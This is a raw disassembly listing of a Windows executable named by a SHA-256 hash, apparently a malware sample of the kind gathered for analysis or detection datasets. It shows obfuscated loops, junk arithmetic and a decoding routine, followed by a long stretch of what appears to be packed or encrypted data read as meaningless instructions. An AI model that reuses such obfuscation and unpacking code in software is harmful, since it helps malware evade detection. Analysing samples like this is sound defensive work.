
c0a902d16d9d2c215e66bd0c7df062fb20f92eea6ff78d993e68d61bea00036e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    al,0x37
  401006:	cmp    DWORD PTR [ebp+0x0],ecx
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],dh
  40100d:	adc    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ecx],al
  401011:	add    BYTE PTR [eax],al
  401013:	add    BYTE PTR [ecx],al
  401015:	add    BYTE PTR [eax],al
  401017:	add    BYTE PTR [ecx],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],ch
  40101d:	adc    BYTE PTR [eax],al
  40101f:	add    BYTE PTR [eax+edx*1],ch
  401022:	add    BYTE PTR [eax],al
  401024:	xor    BYTE PTR [eax],dl
  401026:	add    BYTE PTR [eax],al
  401028:	xor    BYTE PTR [eax+eax*1+0x103e00],al
  40102f:	add    BYTE PTR [eax],al
  401031:	add    BYTE PTR [edi+0x6f],dl
  401034:	jb     0x40109a
  401036:	push   edi
  401037:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  40103e:	aas    
  40103f:	inc    ebx
  401040:	ins    BYTE PTR es:[edi],dx
  401041:	outs   dx,DWORD PTR ds:[esi]
  401042:	jae    0x4010a9
  401044:	push   edi
  401045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  40104c:	popa   
  40104d:	je     0x4010b8
  40104f:	outs   dx,DWORD PTR ds:[esi]
  401050:	outs   dx,BYTE PTR ds:[esi]
  401051:	inc    ebx
  401052:	ins    BYTE PTR es:[edi],dx
  401053:	outs   dx,DWORD PTR ds:[esi]
  401054:	jae    0x4010bb
  401056:	push   edi
  401057:	imul   edx,DWORD PTR [ebp-0x75],0xa4ec81ec
  40105e:	add    BYTE PTR [eax],al
  401060:	add    BYTE PTR [ebx+0x3d11084d],cl
  401066:	add    BYTE PTR [eax-0x7a47ffbe],ah
  40106c:	mov    al,BYTE PTR [eax]
  40106e:	add    BYTE PTR [esi+0x33],ah
  401071:	inc    ecx
  401072:	and    BYTE PTR [ebx],ch
  401074:	or     eax,0x42b00c
  401079:	mov    ecx,0x3b4b
  40107e:	xor    DWORD PTR ds:0x429018,0x42b01c
  401088:	add    ax,cx
  40108b:	adc    ecx,DWORD PTR ds:0x42c010
  401091:	movzx  eax,ax
  401094:	mov    ecx,DWORD PTR ds:0x423e20
  40109a:	mov    ecx,DWORD PTR [ecx]
  40109c:	sub    DWORD PTR ds:0x42d014,ecx
  4010a2:	mov    DWORD PTR [ebp-0x18],eax
  4010a5:	and    DWORD PTR ds:0x42c008,ebx
  4010ab:	mov    BYTE PTR [ebp-0x1],0x61
  4010af:	sbb    ecx,0x3fcf
  4010b5:	lea    eax,[ebp-0x1]
  4010b8:	xor    ecx,ecx
  4010ba:	xor    ecx,DWORD PTR ds:0x429024
  4010c0:	adc    ecx,DWORD PTR ds:0x42b004
  4010c6:	mov    DWORD PTR ds:0x429024,ecx
  4010cc:	mov    DWORD PTR [ebp-0x10],eax
  4010cf:	mov    ecx,DWORD PTR ds:0x42d01c
  4010d5:	sub    DWORD PTR ds:0x42900c,ecx
  4010db:	mov    al,BYTE PTR [ebp-0x1]
  4010de:	mov    ecx,DWORD PTR [ebp-0x10]
  4010e1:	xor    DWORD PTR ds:0x42b004,0x42900c
  4010eb:	xor    al,0x6f
  4010ed:	sub    al,0xd
  4010ef:	adc    DWORD PTR ds:0x42d008,0x362f
  4010f9:	mov    BYTE PTR [ecx],al
  4010fb:	mov    DWORD PTR ds:0x429020,0x1b
  401105:	cmp    DWORD PTR ds:0x429020,0x0
  40110c:	je     0x40113f
  401112:	cmp    DWORD PTR ds:0x429020,0x24
  401119:	jne    0x40112d
  40111f:	push   DWORD PTR [ebp-0x24]
  401122:	push   0x42450c
  401127:	call   DWORD PTR ds:0x425010
  40112d:	mov    ecx,DWORD PTR ds:0x429020
  401133:	dec    ecx
  401134:	mov    DWORD PTR ds:0x429020,ecx
  40113a:	jmp    0x401105
  40113f:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  401146:	push   ebx
  401147:	sub    ecx,eax
  401149:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  401150:	and    DWORD PTR ds:0x42901c,ebx
  401156:	mov    ecx,DWORD PTR [ebp-0x14]
  401159:	push   esi
  40115a:	mov    eax,0x7510893
  40115f:	xor    ecx,eax
  401161:	or     esi,DWORD PTR ds:0x42900c
  401167:	mov    esi,0x3272db
  40116c:	and    DWORD PTR ds:0x429024,0x1a45
  401176:	push   edi
  401177:	sub    DWORD PTR ds:0x42c018,0x2ac6
  401181:	add    ecx,esi
  401183:	mov    DWORD PTR ds:0x42c008,0x57e6
  40118d:	jmp    0x4011bb
  401192:	mov    DWORD PTR ds:0x42a014,0x4932
  40119c:	mov    dl,BYTE PTR [ebp-0x1]
  40119f:	mov    DWORD PTR ds:0x42d014,0x6fce
  4011a9:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  4011b0:	mov    DWORD PTR ds:0x42c010,0x5862
  4011ba:	inc    ecx
  4011bb:	mov    DWORD PTR ds:0x42a018,0x6e07
  4011c5:	cmp    ecx,0x40
  4011c8:	jb     0x401192
  4011ce:	sbb    DWORD PTR ds:0x42a010,0x6c84
  4011d8:	mov    edx,DWORD PTR [ebp-0x14]
  4011db:	add    DWORD PTR ds:0x42b004,0x42900c
  4011e5:	xor    edx,eax
  4011e7:	sub    DWORD PTR ds:0x42c018,0x6b15
  4011f1:	add    edx,esi
  4011f3:	jmp    0x40132b
  4011f8:	add    DWORD PTR ds:0x42b000,ecx
  4011fe:	mov    edi,DWORD PTR [ebp+0x8]
  401201:	mov    DWORD PTR ds:0x42b010,0x1a
  40120b:	cmp    DWORD PTR ds:0x42b010,0x0
  401212:	je     0x40126b
  401218:	cmp    DWORD PTR ds:0x42b010,0x3
  40121f:	jne    0x401233
  401225:	push   0x3d21
  40122a:	push   DWORD PTR [ebp-0x10]
  40122d:	call   DWORD PTR ds:0x425018
  401233:	cmp    DWORD PTR ds:0x42b010,0x4
  40123a:	jne    0x40124f
  401240:	xor    ecx,ecx
  401242:	or     ecx,DWORD PTR ds:0x42b010
  401248:	dec    ecx
  401249:	mov    DWORD PTR ds:0x42b010,ecx
  40124f:	mov    ecx,DWORD PTR ds:0x42b010
  401255:	dec    ecx
  401256:	mov    DWORD PTR ds:0x42b010,ecx
  40125c:	jmp    0x40120b
  401261:	or     DWORD PTR ds:0x429004,0x4238
  40126b:	mov    ecx,0x8a85
  401270:	sbb    DWORD PTR ds:0x42a014,0x4641
  40127a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40127f:	xor    DWORD PTR ds:0x42901c,edi
  401285:	mov    edi,0x3b4b
  40128a:	add    cx,di
  40128d:	and    DWORD PTR ds:0x42a01c,0x60c1
  401297:	movzx  ecx,cx
  40129a:	mov    DWORD PTR [ebp-0x10],ecx
  40129d:	and    DWORD PTR ds:0x42c014,0x0
  4012a7:	jmp    0x4012b9
  4012ac:	mov    ecx,DWORD PTR ds:0x42c014
  4012b2:	inc    ecx
  4012b3:	mov    DWORD PTR ds:0x42c014,ecx
  4012b9:	cmp    DWORD PTR ds:0x42c014,0x14
  4012c0:	jae    0x4012ec
  4012c6:	cmp    DWORD PTR ds:0x42c014,0x19
  4012cd:	jne    0x4012e5
  4012d3:	push   0x42d008
  4012d8:	push   0x0
  4012da:	push   0x42444f
  4012df:	call   DWORD PTR ds:0x42501c
  4012e5:	jmp    0x4012ac
  4012ea:	neg    ecx
  4012ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4012ef:	mov    DWORD PTR ds:0x42a000,0x57bf
  4012f9:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012fd:	xor    ecx,0x8a85
  401303:	add    DWORD PTR ds:0x42b00c,0x42c004
  40130d:	add    ecx,edi
  40130f:	movzx  edi,BYTE PTR ds:0x42c018
  401316:	mov    edi,DWORD PTR [ebp-0x10]
  401319:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  401320:	mov    DWORD PTR ds:0x429024,0x374e
  40132a:	inc    edx
  40132b:	mov    ecx,0x6cf1
  401330:	mov    ecx,DWORD PTR [ebp-0x18]
  401333:	cmp    edx,ecx
  401335:	jne    0x4011f8
  40133b:	mov    ecx,DWORD PTR [ebp-0x14]
  40133e:	and    DWORD PTR ds:0x42d014,0x0
  401348:	mov    edx,DWORD PTR ds:0x42d014
  40134e:	inc    edx
  40134f:	mov    DWORD PTR ds:0x42d014,edx
  401355:	cmp    DWORD PTR ds:0x42d014,0x1e
  40135c:	jne    0x401370
  401362:	push   0x42a010
  401367:	push   DWORD PTR [ebp-0xc]
  40136a:	call   DWORD PTR ds:0x425020
  401370:	cmp    DWORD PTR ds:0x42d014,0x1a
  401377:	jb     0x401348
  40137d:	mov    edx,DWORD PTR [ebp+0x10]
  401380:	add    DWORD PTR ds:0x429018,0x42d01c
  40138a:	xor    ecx,eax
  40138c:	add    ecx,esi
  40138e:	mov    DWORD PTR [edx],ecx
  401390:	xor    DWORD PTR ds:0x429020,0x151c
  40139a:	mov    ecx,DWORD PTR [ebp-0x14]
  40139d:	sbb    DWORD PTR ds:0x42a004,0x76e2
  4013a7:	xor    ecx,eax
  4013a9:	add    ecx,esi
  4013ab:	mov    DWORD PTR [ebp-0x20],ecx
  4013ae:	mov    DWORD PTR ds:0x42c00c,0x69f9
  4013b8:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  4013bf:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013c6:	mov    DWORD PTR ds:0x42c00c,ecx
  4013cc:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	mov    DWORD PTR ds:0x429004,0x7870
  4013e0:	mov    DWORD PTR [ebp+0x8],ecx
  4013e3:	jmp    0x4015f6
  4013e8:	xor    DWORD PTR ds:0x42a014,0x45a5
  4013f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4013f5:	and    DWORD PTR ds:0x42b008,0x0
  4013ff:	mov    edx,DWORD PTR ds:0x42b008
  401405:	inc    edx
  401406:	mov    DWORD PTR ds:0x42b008,edx
  40140c:	cmp    DWORD PTR ds:0x42b008,0x29
  401413:	jne    0x401424
  401419:	push   0x3311
  40141e:	call   DWORD PTR ds:0x425028
  401424:	cmp    DWORD PTR ds:0x42b008,0x1f
  40142b:	jb     0x4013ff
  401431:	adc    DWORD PTR ds:0x42a008,0x7a1a
  40143b:	mov    edx,DWORD PTR [ebp-0x8]
  40143e:	neg    DWORD PTR ds:0x42b00c
  401444:	xor    ecx,eax
  401446:	xor    DWORD PTR ds:0x429018,0x42b01c
  401450:	xor    edx,eax
  401452:	or     DWORD PTR ds:0x429020,0x5996
  40145c:	sub    ecx,edx
  40145e:	movzx  edx,BYTE PTR ds:0x42a014
  401465:	adc    DWORD PTR ds:0x429028,edx
  40146b:	sub    ecx,esi
  40146d:	xor    DWORD PTR ds:0x429028,0xa7c
  401477:	xor    ecx,eax
  401479:	not    edx
  40147b:	mov    DWORD PTR [ebp+0x8],ecx
  40147e:	add    DWORD PTR ds:0x42a01c,0x480
  401488:	mov    ecx,DWORD PTR [ebp+0x8]
  40148b:	mov    edx,DWORD PTR [ebp-0x64]
  40148e:	or     DWORD PTR ds:0x429028,0x2c95
  401498:	lea    ecx,[edx+ecx*1+0x5708f5]
  40149f:	and    edx,0x1ea1
  4014a5:	mov    DWORD PTR [ebp-0x64],ecx
  4014a8:	and    DWORD PTR ds:0x42c000,0x0
  4014b2:	jmp    0x4014c4
  4014b7:	mov    ecx,DWORD PTR ds:0x42c000
  4014bd:	inc    ecx
  4014be:	mov    DWORD PTR ds:0x42c000,ecx
  4014c4:	cmp    DWORD PTR ds:0x42c000,0x1f
  4014cb:	jae    0x401506
  4014d1:	cmp    DWORD PTR ds:0x42c000,0x2a
  4014d8:	jne    0x401501
  4014de:	push   DWORD PTR [ebp-0x1c]
  4014e1:	push   DWORD PTR [ebp-0x10]
  4014e4:	push   0x42a004
  4014e9:	push   0x8921
  4014ee:	push   DWORD PTR [ebp-0x24]
  4014f1:	push   0x8115
  4014f6:	push   0x4d38
  4014fb:	call   DWORD PTR ds:0x42502c
  401501:	jmp    0x4014b7
  401506:	mov    ecx,DWORD PTR [ebp+0x8]
  401509:	mov    edx,DWORD PTR [ebp-0x60]
  40150c:	sub    DWORD PTR ds:0x42a000,0x42a01c
  401516:	lea    ecx,[edx+ecx*1+0x5708f5]
  40151d:	neg    edx
  40151f:	mov    DWORD PTR [ebp-0x60],ecx
  401522:	adc    DWORD PTR ds:0x42d01c,edx
  401528:	mov    ecx,DWORD PTR [ebp+0x8]
  40152b:	add    DWORD PTR ds:0x429008,0x3e29
  401535:	mov    edx,DWORD PTR [ebp-0x5c]
  401538:	add    DWORD PTR ds:0x429028,0x42b010
  401542:	lea    ecx,[edx+ecx*1+0x5708f4]
  401549:	and    DWORD PTR ds:0x42d008,0x0
  401553:	mov    edx,DWORD PTR ds:0x42d008
  401559:	inc    edx
  40155a:	mov    DWORD PTR ds:0x42d008,edx
  401560:	cmp    DWORD PTR ds:0x42d008,0x8
  401567:	jne    0x401576
  40156d:	push   DWORD PTR [ebp-0x20]
  401570:	call   DWORD PTR ds:0x425030
  401576:	cmp    DWORD PTR ds:0x42d008,0x7
  40157d:	jne    0x401592
  401583:	xor    edx,edx
  401585:	or     edx,DWORD PTR ds:0x42d008
  40158b:	inc    edx
  40158c:	mov    DWORD PTR ds:0x42d008,edx
  401592:	cmp    DWORD PTR ds:0x42d008,0x17
  401599:	jb     0x401553
  40159f:	xor    edx,DWORD PTR ds:0x42d00c
  4015a5:	mov    DWORD PTR [ebp-0x5c],ecx
  4015a8:	sbb    ecx,edx
  4015aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4015ad:	xor    DWORD PTR ds:0x42b01c,0x42c004
  4015b7:	mov    edx,DWORD PTR [ebp-0x58]
  4015ba:	lea    ecx,[edx+ecx*1+0x5708fb]
  4015c1:	xor    edx,0x2bb1
  4015c7:	mov    DWORD PTR [ebp-0x58],ecx
  4015ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4015cd:	mov    edx,DWORD PTR [ebp-0x54]
  4015d0:	adc    DWORD PTR ds:0x429024,0x7906
  4015da:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015e1:	not    edx
  4015e3:	mov    DWORD PTR [ebp-0x54],ecx
  4015e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e9:	mov    edx,DWORD PTR [ebp-0x50]
  4015ec:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015f3:	mov    DWORD PTR [ebp-0x50],ecx
  4015f6:	dec    ecx
  4015f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4015fa:	xor    ecx,eax
  4015fc:	or     DWORD PTR ds:0x42d000,0x34f3
  401606:	add    ecx,esi
  401608:	mov    DWORD PTR ds:0x42c01c,0x3161
  401612:	jne    0x4013e8
  401618:	mov    DWORD PTR ds:0x429018,0x1b23
  401622:	jmp    0x405fe7
  401627:	mov    ecx,DWORD PTR [ebp-0x1c]
  40162a:	and    DWORD PTR ds:0x42c000,0x0
  401634:	jmp    0x401648
  401639:	xor    edx,edx
  40163b:	xor    edx,DWORD PTR ds:0x42c000
  401641:	inc    edx
  401642:	mov    DWORD PTR ds:0x42c000,edx
  401648:	cmp    DWORD PTR ds:0x42c000,0x15
  40164f:	jae    0x4016e1
  401655:	cmp    DWORD PTR ds:0x42c000,0xa
  40165c:	jne    0x40166e
  401662:	push   DWORD PTR [ebp-0x14]
  401665:	push   DWORD PTR [ebp-0x14]
  401668:	call   DWORD PTR ds:0x425034
  40166e:	cmp    DWORD PTR ds:0x42c000,0x9
  401675:	jne    0x40168a
  40167b:	xor    edx,edx
  40167d:	add    edx,DWORD PTR ds:0x42c000
  401683:	inc    edx
  401684:	mov    DWORD PTR ds:0x42c000,edx
  40168a:	jmp    0x401639
  40168f:	and    DWORD PTR ds:0x42c000,0x0
  401699:	mov    edx,DWORD PTR ds:0x42c000
  40169f:	inc    edx
  4016a0:	mov    DWORD PTR ds:0x42c000,edx
  4016a6:	cmp    DWORD PTR ds:0x42c000,0x1e
  4016ad:	jne    0x4016c6
  4016b3:	push   0x4243af
  4016b8:	push   0x4244b8
  4016bd:	push   DWORD PTR [ebp-0x18]
  4016c0:	call   DWORD PTR ds:0x42503c
  4016c6:	cmp    DWORD PTR ds:0x42c000,0x12
  4016cd:	jb     0x401699
  4016d3:	xor    edx,edx
  4016d5:	xor    edx,DWORD PTR ds:0x429010
  4016db:	sub    DWORD PTR ds:0x42a01c,edx
  4016e1:	mov    edx,DWORD PTR [ebp-0x8]
  4016e4:	xor    ecx,eax
  4016e6:	xor    edx,eax
  4016e8:	add    DWORD PTR ds:0x429014,0x42d010
  4016f2:	sub    ecx,edx
  4016f4:	mov    DWORD PTR ds:0x42d00c,0x49b3
  4016fe:	sub    ecx,esi
  401700:	xor    ecx,eax
  401702:	mov    DWORD PTR ds:0x42901c,0x3f4e
  40170c:	mov    DWORD PTR [ebp-0x1c],ecx
  40170f:	mov    ecx,DWORD PTR ds:0x42b014
  401715:	mov    ecx,DWORD PTR [ebp-0xc]
  401718:	mov    DWORD PTR [ebp+0x8],ecx
  40171b:	jmp    0x40174d
  401720:	mov    ecx,DWORD PTR [ebp+0x8]
  401723:	mov    edx,DWORD PTR [ebp-0x8]
  401726:	xor    ecx,eax
  401728:	xor    edx,eax
  40172a:	sub    ecx,edx
  40172c:	sub    ecx,esi
  40172e:	xor    ecx,eax
  401730:	mov    DWORD PTR [ebp+0x8],ecx
  401733:	mov    ecx,DWORD PTR [ebp+0x8]
  401736:	mov    edx,DWORD PTR [ebp+0x8]
  401739:	imul   edx,edx,0x5708f5
  40173f:	xor    ecx,eax
  401741:	add    ecx,esi
  401743:	lea    ecx,[ebp+ecx*4-0x64]
  401747:	mov    edi,DWORD PTR [ecx]
  401749:	add    edx,edi
  40174b:	mov    DWORD PTR [ecx],edx
  40174d:	mov    ecx,DWORD PTR [ebp+0x8]
  401750:	xor    ecx,eax
  401752:	add    ecx,esi
  401754:	jne    0x401720
  40175a:	mov    ecx,DWORD PTR [ebp-0x20]
  40175d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401764:	mov    dl,BYTE PTR [ebp-0x1]
  401767:	cmp    cl,dl
  401769:	je     0x405f48
  40176f:	mov    ecx,DWORD PTR [ebp-0x20]
  401772:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401779:	mov    edx,DWORD PTR [ebp+0xc]
  40177c:	cmp    cl,BYTE PTR [edx]
  40177e:	jne    0x405ff9
  401784:	mov    ecx,DWORD PTR [ebp-0x14]
  401787:	mov    edx,DWORD PTR [ebp+0xc]
  40178a:	movsx  edx,BYTE PTR [edx]
  40178d:	xor    ecx,eax
  40178f:	add    ecx,esi
  401791:	jmp    0x403b14
  401796:	add    al,0xcb
  401798:	xchg   edi,eax
  401799:	dec    esp
  40179a:	xchg   edi,eax
  40179b:	in     al,0x63
  40179d:	sbb    DWORD PTR [edx],0xffffff98
  4017a0:	adc    al,0xee
  4017a2:	cdq    
  4017a3:	xchg   ebp,eax
  4017a4:	daa    
  4017a5:	sti    
  4017a6:	bound  esp,QWORD PTR [edx+0x62]
  4017a9:	bound  ebx,QWORD PTR [edi+ebx*2]
  4017ac:	bound  esp,QWORD PTR [edx+0x9]
  4017af:	xor    BYTE PTR [edi],al
  4017b1:	cmp    eax,0xf033905
  4017b6:	jns    0x4017de
  4017b8:	jne    0x401830
  4017ba:	mov    bh,0x7c
  4017bc:	jb     0x401830
  4017be:	jno    0x4017ea
  4017c0:	fld    st(0)
  4017c2:	std    
  4017c3:	dec    esp
  4017c4:	push   esp
  4017c5:	jae    0x401844
  4017c7:	inc    ebx
  4017c8:	mov    WORD PTR [ecx+esi*2+0x45],?
  4017cc:	scas   eax,DWORD PTR es:[edi]
  4017cd:	inc    ecx
  4017ce:	push   edx
  4017cf:	cmp    al,0x90
  4017d1:	loop   0x40176a
  4017d3:	inc    di
  4017d5:	push   ecx
  4017d6:	jg     0x4017ff
  4017d8:	ins    BYTE PTR es:[edi],dx
  4017d9:	mov    dh,0x7f
  4017db:	mov    esp,0xff3023ba
  4017e0:	jbe    0x4017a2
  4017e2:	loop   0x40182f
  4017e4:	jg     0x401804
  4017e6:	icebp  
  4017e7:	and    eax,0x97f1a2d1
  4017ec:	or     ebx,esi
  4017ee:	xchg   ebx,eax
  4017ef:	xor    eax,0x92b345ef
  4017f4:	fsub   st,st(7)
  4017f6:	jno    0x4017b9
  4017f8:	sbb    al,cl
  4017fa:	out    dx,al
  4017fb:	loop   0x401833
  4017fd:	add    al,0x54
  4017ff:	adc    BYTE PTR [esi],dh
  401801:	jae    0x401877
  401803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401804:	(bad)  
  401805:	or     ebx,DWORD PTR [ebp+0x19]
  401808:	mov    dh,0xff
  40180a:	cmc    
  40180b:	push   ebp
  40180c:	xor    ebp,DWORD PTR [eax+0x2a]
  40180f:	aam    0x43
  401811:	in     eax,0x2
  401813:	loop   0x401879
  401815:	mov    ebp,0x5f84c17b
  40181a:	xchg   ebx,eax
  40181b:	mov    ebp,0x2d9a0817
  401820:	jmp    0x4017c0
  401822:	and    BYTE PTR [edx+0x6b],ch
  401825:	adc    eax,edx
  401827:	xor    DWORD PTR [edx-0x6f],ecx
  40182a:	sub    BYTE PTR [ebx],ch
  40182c:	dec    eax
  40182d:	sti    
  40182e:	scas   eax,DWORD PTR es:[edi]
  40182f:	xchg   edx,eax
  401830:	xor    eax,0xd0a7ac95
  401835:	xchg   esp,eax
  401836:	dec    ebp
  401837:	clc    
  401838:	pop    ecx
  401839:	dec    edx
  40183a:	push   eax
  40183b:	adc    BYTE PTR [esi],bh
  40183d:	jmp    0x401865
  40183f:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  401845:	fcomp  QWORD PTR [eax]
  401847:	inc    esi
  401848:	loope  0x401894
  40184a:	inc    esi
  40184b:	mov    ecx,0xe4bf74e5
  401850:	pop    edx
  401851:	sbb    eax,0xd9b3073e
  401856:	cwde   
  401857:	ror    BYTE PTR [ebx],cl
  401859:	sbb    DWORD PTR [eax],esp
  40185b:	xchg   edi,eax
  40185c:	scas   al,BYTE PTR es:[edi]
  40185d:	sub    DWORD PTR ds:0x6c9d81b8,edx
  401863:	sub    BYTE PTR [ebp+eiz*8+0x34],dl
  401867:	std    
  401868:	inc    edi
  401869:	jl     0x40186b
  40186b:	mov    ds:0xef7d1323,al
  401870:	retf   0x18a9
  401873:	or     DWORD PTR [ebp+0x5f],eax
  401876:	mov    ebx,0xdd962fd
  40187b:	loope  0x401826
  40187d:	fcmovu st,st(5)
  40187f:	popa   
  401880:	push   ebp
  401881:	mov    ah,0x9c
  401883:	pop    ss
  401884:	xchg   bh,dh
  401886:	out    dx,al
  401887:	pop    esp
  401888:	cmp    DWORD PTR ds:0x9fc86ac5,eax
  40188e:	xchg   ebp,eax
  40188f:	pop    ebx
  401890:	outs   dx,BYTE PTR ds:[esi]
  401891:	mov    ecx,0x6f11e3f6
  401896:	cdq    
  401897:	inc    esp
  401898:	inc    esp
  401899:	and    eax,0xc11d8c5a
  40189e:	adc    eax,DWORD PTR [eax+ecx*1+0x4fc01f8]
  4018a5:	fldenv ds:0x869ae0b1
  4018ab:	sbb    eax,0x8aa61c10
  4018b0:	xchg   ebx,eax
  4018b1:	push   esi
  4018b2:	mov    ebx,0x5e649274
  4018b7:	int3   
  4018b8:	xchg   ebp,eax
  4018b9:	jg     0x40185c
  4018bb:	mov    ds:0x9bb661e9,al
  4018c0:	adc    BYTE PTR [ecx+0x41],dl
  4018c3:	aam    0xef
  4018c5:	dec    esi
  4018c6:	in     al,0x3e
  4018c8:	fild   WORD PTR [edi-0xf]
  4018cb:	je     0x401887
  4018cd:	js     0x401901
  4018cf:	sar    DWORD PTR [esi-0x50d5652f],cl
  4018d5:	(bad)  
  4018d7:	shl    DWORD PTR [ecx+0x55b6bf6b],1
  4018dd:	mov    bh,0x14
  4018df:	and    BYTE PTR [eax-0x528d95b8],bh
  4018e5:	clc    
  4018e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018e7:	inc    ecx
  4018e8:	push   0xffffff9b
  4018ea:	xchg   ecx,eax
  4018eb:	cmp    eax,0xf496f81c
  4018f0:	lock sub al,0xc8
  4018f3:	add    dl,BYTE PTR [ebx]
  4018f5:	and    eax,0xc40641d
  4018fa:	cmp    al,0xb9
  4018fc:	xchg   ebp,eax
  4018fd:	xor    BYTE PTR [edx+ebp*4+0x88b5da8],al
  401904:	test   BYTE PTR [ebp+0x6f7ccb2c],ah
  40190a:	mov    bh,0x4
  40190c:	push   edi
  40190d:	scas   al,BYTE PTR es:[edi]
  40190e:	xor    ecx,DWORD PTR [ebx]
  401910:	or     bh,bl
  401912:	outs   dx,BYTE PTR ds:[esi]
  401913:	nop
  401914:	dec    ebp
  401915:	lahf   
  401916:	jg     0x40189c
  401918:	jo     0x4018f4
  40191a:	sbb    DWORD PTR [edx+ebp*4-0x32b4a497],esp
  401921:	sti    
  401922:	mov    ebx,0x3d24a14d
  401927:	push   cs
  401928:	jl     0x401901
  40192a:	shl    DWORD PTR [edx],0x23
  40192d:	(bad)  
  40192e:	push   esi
  40192f:	sahf   
  401930:	cld    
  401931:	or     DWORD PTR [ecx-0x6a654c5f],ebp
  401937:	stos   BYTE PTR es:[edi],al
  401938:	push   cs
  401939:	call   0x7342c99d
  40193e:	push   edx
  40193f:	adc    DWORD PTR [ebp+0x69],0xffffff8e
  401943:	and    ebx,DWORD PTR [eax+ecx*8]
  401946:	xchg   esi,eax
  401947:	(bad)  
  401948:	sub    edx,edi
  40194a:	add    BYTE PTR [edx-0xa],ah
  40194d:	in     al,dx
  40194e:	hlt    
  40194f:	jne    0x40193e
  401951:	and    eax,0xca0b6bb7
  401956:	inc    edi
  401957:	cdq    
  401958:	retf   
  401959:	out    0x82,eax
  40195b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40195d:	(bad)  
  40195e:	jle    0x401909
  401960:	mov    edx,0xa8a1a649
  401965:	imul   esi,DWORD PTR [ebx+0x31],0x7b
  401969:	jns    0x401983
  40196b:	int    0x67
  40196d:	xor    al,0x54
  40196f:	sub    cl,ch
  401971:	adc    eax,0x319ada3f
  401976:	enter  0x6c47,0x6e
  40197a:	pop    ecx
  40197b:	xchg   edi,eax
  40197c:	int    0xdd
  40197e:	scas   eax,DWORD PTR es:[edi]
  40197f:	cmc    
  401980:	addr16 dec edi
  401982:	ja     0x40194f
  401984:	sbb    al,0x23
  401986:	push   0xfffffffa
  401988:	jns    0x4019ac
  40198a:	sub    BYTE PTR [ecx-0x70],al
  40198d:	and    BYTE PTR [esi],cl
  40198f:	xchg   DWORD PTR [eax+0xa22d91f],edi
  401995:	repz mov ah,BYTE PTR [eax+0xb339fa3]
  40199c:	(bad)  
  40199d:	fnstsw WORD PTR [ebp+ecx*4+0x3d138d07]
  4019a4:	adc    dl,BYTE PTR [eax]
  4019a6:	push   edx
  4019a7:	mov    ebp,0x37c4bb18
  4019ac:	mov    cl,0xff
  4019ae:	xchg   cl,bl
  4019b0:	call   0xb18bbc01
  4019b5:	cwde   
  4019b6:	cmp    BYTE PTR [edi+0x35],dh
  4019b9:	scas   eax,DWORD PTR es:[edi]
  4019ba:	sub    al,0xcc
  4019bc:	out    dx,eax
  4019bd:	out    0x7b,al
  4019bf:	mov    ds:0xb77df8c3,eax
  4019c4:	in     al,0x86
  4019c6:	scas   al,BYTE PTR es:[edi]
  4019c7:	mov    al,ah
  4019c9:	pop    esi
  4019ca:	or     DWORD PTR [ecx],esp
  4019cc:	std    
  4019cd:	push   edi
  4019ce:	std    
  4019cf:	inc    ecx
  4019d0:	mov    bh,BYTE PTR [edx-0xd10284f]
  4019d6:	inc    ebp
  4019d7:	fsub   QWORD PTR [esi]
  4019d9:	gs sbb edi,esi
  4019dc:	push   ss
  4019dd:	imul   ecx,DWORD PTR [esi+0x1f3c1a9f],0x3e8d24e5
  4019e7:	mov    bh,0xa2
  4019e9:	sahf   
  4019ea:	xchg   ebx,eax
  4019eb:	push   es
  4019ec:	inc    ecx
  4019ed:	and    eax,0x315ebe7b
  4019f2:	adc    bh,bh
  4019f4:	add    BYTE PTR [eax+0x1e],0x8c
  4019f8:	push   ebx
  4019f9:	(bad)  
  4019fa:	mov    cl,0xb1
  4019fc:	mov    edi,0xe80a4aec
  401a01:	add    eax,0x35776a15
  401a06:	dec    edx
  401a07:	mov    BYTE PTR [eax-0x3e947d93],0x7a
  401a0e:	and    al,0x5d
  401a10:	(bad)  
  401a11:	push   ebx
  401a12:	ret    0x630b
  401a15:	inc    ebp
  401a16:	add    al,0x87
  401a18:	in     al,dx
  401a19:	mov    eax,ds:0x2c58dc51
  401a1e:	and    BYTE PTR [edx+0x7f0dcef6],0x7a
  401a25:	inc    ebx
  401a26:	(bad)  
  401a28:	bound  ecx,QWORD PTR [edx+0x27e967f9]
  401a2e:	popf   
  401a2f:	push   edx
  401a30:	sub    bl,BYTE PTR [edi+0x64e9ee7b]
  401a36:	pop    ecx
  401a37:	pop    ds
  401a38:	pop    esi
  401a39:	xor    DWORD PTR [edx+0x1],esp
  401a3c:	mov    ds,eax
  401a3e:	push   edi
  401a3f:	pop    esi
  401a40:	(bad)  
  401a41:	loopne 0x401a58
  401a43:	sub    DWORD PTR [edx],esi
